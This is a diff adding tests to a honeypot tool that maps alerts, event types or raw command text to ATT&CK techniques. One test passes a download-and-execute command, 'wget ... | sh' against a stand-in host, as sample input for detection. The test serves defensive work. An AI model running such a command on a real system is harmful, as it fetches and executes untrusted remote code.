@@ -103,3 +103,26 @@ async def test_an_empty_database_is_an_empty_summary_not_an_error():
     out = await attack_summary()
 
     assert out["total_alerts"] == 0 and out["tactics"] == [] and out["mapped_share"] == 0.0
+
+
+async def test_event_types_or_text_map_to_techniques_with_evidence_instead_of_summarising():
+    from honeypot_mcp.tools.analysis import attack_summary
+
+    await _seed([("redis_config_set", 5, timedelta(0))])
+    by_type = await attack_summary(event_types=["ssh_login_failed"])
+    by_text = await attack_summary(raw_text="wget http://example.test/a.sh | sh")
+
+    assert "tactics" not in by_type and "total_alerts" not in by_type
+    assert by_type["based_on"] == "event_types"
+    assert any(t["technique_id"].startswith("T1110") for t in by_type["techniques"])
+    assert by_text["based_on"] == "raw_text" and by_text["count"] == len(by_text["techniques"])
+
+
+async def test_an_ip_maps_its_own_alerts_and_a_bad_ip_is_refused():
+    from honeypot_mcp.tools.analysis import attack_summary
+
+    await _seed([("ssh_login_failed", 3, timedelta(0))])
+    out = await attack_summary(ip="198.51.100.1")
+
+    assert "most recent alerts from 198.51.100.1" in out["based_on"]
+    assert "error" in await attack_summary(ip="not-an-ip")
